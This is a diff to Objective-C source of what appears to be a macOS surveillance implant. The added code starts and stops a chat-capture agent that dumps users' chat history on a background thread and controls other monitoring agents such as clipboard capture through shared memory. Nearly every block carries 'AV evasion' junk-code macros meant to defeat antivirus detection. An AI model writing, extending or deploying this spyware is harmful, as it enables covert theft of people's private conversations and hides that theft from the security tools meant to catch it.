-        [_logManager closeActiveLog: AGENT_CHAT_NEW
-                          withLogID: 0];
-      }
-      else
       {
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+      
+          // agent chat as history dump starts here
+          __m_MAgentChat *agentChat = [__m_MAgentChat sharedInstance];
+          if ([agentChat stop] == FALSE)
+          {
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"Error while sending Stop command to agent CHAT");
+              errorLog(@"Error while stopping agent chat history dump");
+#endif
+          }
+          // agent chat as history dump stops here
+        
+          agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+      
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          shMemoryHeader->agentID         = agentID;
+          shMemoryHeader->direction       = D_TO_AGENT;
+          shMemoryHeader->command         = AG_STOP;
+      
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+      
+          if ([gSharedMemoryCommand writeMemory: agentCommand
+                                         offset: OFFT_IM
+                                  fromComponent: COMP_CORE] == TRUE)
+          {
+              // AV evasion: only on release build
+              AV_GARBAGE_000
+        
+              agentConfiguration = [self getConfigForAgent: agentID];
+              [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+        
+              // AV evasion: only on release build
+              AV_GARBAGE_004
+        
+              [_logManager closeActiveLog: AGENT_CHAT_NEW
+                                withLogID: 0];
+          }
+          else
+          {
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Error while sending Stop command to agent CHAT");
 #endif
         
-        return NO;
+              //return NO;
+          }
+          break;
       }
-      break;
-    }
     case AGENT_CLIPBOARD:
     {
       agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
@@ -2609,7 +2642,7 @@ static NSLock *gSyncLock                  = nil;
     // AV evasion: only on release build
     AV_GARBAGE_005
     
-    if ([anObject objectForKey: @"status"] == AGENT_RUNNING)
+    if ([[anObject objectForKey: @"status"] isEqualToString: AGENT_RUNNING])
     {
       int retry = 0;
       
@@ -2621,7 +2654,7 @@ static NSLock *gSyncLock                  = nil;
       // AV evasion: only on release build
       AV_GARBAGE_008
       
-      while (([anObject objectForKey: @"status"] != AGENT_STOPPED) &&
+      while (![[anObject objectForKey: @"status"] isEqualToString: AGENT_STOPPED] &&
              (retry++ < MAX_RETRY_TIME))
       {
         sleep(1);
@@ -2684,7 +2717,7 @@ static NSLock *gSyncLock                  = nil;
       // AV evasion: only on release build
       AV_GARBAGE_003
       
-      if ([anObject objectForKey: @"status"] == AGENT_SUSPENDED )
+      if ([[anObject objectForKey: @"status"] isEqualToString: AGENT_SUSPENDED] )
         {
           [self startAgent:agentID];
           
@@ -3050,35 +3083,45 @@ static NSLock *gSyncLock                  = nil;
         }
         case AGENT_CHAT_NEW:
         {          
-          // AV evasion: only on release build
-          AV_GARBAGE_001
+            // AV evasion: only on release build
+            AV_GARBAGE_001
+
+            // agent chat as history dump starts here
+            __m_MAgentChat *agentChat = [__m_MAgentChat sharedInstance];
+            if ([agentChat stop] == FALSE)
+            {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"Error while stopping agent chat history dump");
+#endif
+            }
+            // agent chat as history dump stops here
+
+            NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
           
-          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+            // AV evasion: only on release build
+            AV_GARBAGE_002
           
-          // AV evasion: only on release build
-          AV_GARBAGE_002
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+            shMemoryHeader->agentID         = agentID;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_STOP;
           
-          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-          shMemoryHeader->agentID         = agentID;
-          shMemoryHeader->direction       = D_TO_AGENT;
-          shMemoryHeader->command         = AG_STOP;
+            // AV evasion: only on release build
+            AV_GARBAGE_003
           
-          // AV evasion: only on release build
-          AV_GARBAGE_003
-          
-          if ([gSharedMemoryCommand writeMemory: agentCommand
+            if ([gSharedMemoryCommand writeMemory: agentCommand
                                          offset: OFFT_IM
                                   fromComponent: COMP_CORE] == TRUE)
-          {
-            // AV evasion: only on release build
-            AV_GARBAGE_004
+            {
+                // AV evasion: only on release build
+                AV_GARBAGE_004
             
-            [anObject setObject: AGENT_STOPPED forKey: @"status"];
-          }
+                [anObject setObject: AGENT_STOPPED forKey: @"status"];
+            }
           
-          [agentCommand release];
+            [agentCommand release];
           
-          break;
+            break;
         }
         case AGENT_CLIPBOARD:
         {          
@@ -3773,9 +3816,28 @@ static NSLock *gSyncLock                  = nil;
               }
             case AGENT_CHAT_NEW:
               {         
-                // AV evasion: only on release build
-                AV_GARBAGE_007
+                  // AV evasion: only on release build
+                  AV_GARBAGE_007
                 
+                  ///// agent chat as history dump starts here
+                  __m_MAgentChat *agentChat = [__m_MAgentChat sharedInstance];
+                  agentConfiguration = [[anObject objectForKey: @"data"] retain];
+                  
+                  // AV evasion: only on release build
+                  AV_GARBAGE_007
+                  
+                  [anObject setObject: AGENT_START
+                               forKey: @"status"];
+                  [agentChat setAgentConfiguration: anObject];
+                  
+                  // AV evasion: only on release build
+                  AV_GARBAGE_004
+                  
+                  [NSThread detachNewThreadSelector: @selector(start)
+                                           toTarget: agentChat
+                                         withObject: nil];
+                  ///// agent chat as history dump ends here
+
                 agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                 
                 shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
@@ -3930,8 +3992,8 @@ static NSLock *gSyncLock                  = nil;
                 
                 if (agentConfiguration != nil)
                   {
-                    if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
-                        && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+                    if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
+                        && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
                       {         
                         // AV evasion: only on release build
                         AV_GARBAGE_007
@@ -3980,8 +4042,8 @@ static NSLock *gSyncLock                  = nil;
                     // AV evasion: only on release build
                     AV_GARBAGE_001
                   
-                    if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING
-                     && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+                    if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
+                     && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
                       {         
                         // AV evasion: only on release build
                         AV_GARBAGE_003
@@ -4450,7 +4512,7 @@ static NSLock *gSyncLock                  = nil;
       [anObject setValue: EVENT_STOP
                   forKey: @"status"];
       
-      while ([anObject objectForKey: @"status"] != EVENT_STOPPED
+      while (![[anObject objectForKey: @"status"] isEqualToString: EVENT_STOPPED]
              && counter <= MAX_STOP_WAIT_TIME)
         {
           usleep(100000);
